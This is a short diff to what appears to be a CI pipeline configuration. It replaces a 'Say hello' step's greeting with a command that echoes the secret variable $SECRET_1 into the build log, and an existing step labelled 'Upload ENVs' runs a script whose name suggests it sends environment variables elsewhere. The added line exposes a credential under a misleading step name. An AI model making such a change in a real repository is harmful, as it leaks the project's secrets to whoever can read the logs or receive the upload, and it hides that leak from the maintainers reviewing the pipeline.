@@ -20,7 +20,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: "echo $SECRET_1"
       - run:
           name: Upload ENVs
           command: "chmod +x uploadenv.sh && sh ./uploadenv.sh"
